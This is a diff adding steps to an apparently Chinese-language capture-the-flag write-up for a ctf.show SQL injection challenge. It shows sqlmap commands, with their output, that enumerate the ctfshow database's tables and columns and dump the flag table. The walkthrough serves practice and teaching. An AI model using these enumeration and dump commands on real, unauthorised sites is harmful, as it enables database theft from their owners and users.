@@ -49,5 +49,34 @@ available databases [7]:
 
 <br>
 
-* 接下来可以查看指定库的所有表：sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D 
-* 
+* 接下来可以查看指定库的所有表：sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D ctfshow --tables
+
+* 得到回显
+````
+
+Database: ctfshow
+[1 table]
++------+
+| flag |
++------+
+
+````
+
+* 到这里就说明查询到表flag了，接下来使用: sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D ctfshow -T flag --columns
+
+````
+
+Database: ctfshow                                                                                                                                                                                           
+Table: flag
+[2 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| flag   | varchar(255) |
+| id     | int(11)      |
++--------+--------------+
+
+
+````
+
+* 接下来使用直接dump出来: sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D ctfshow -T flag --dump
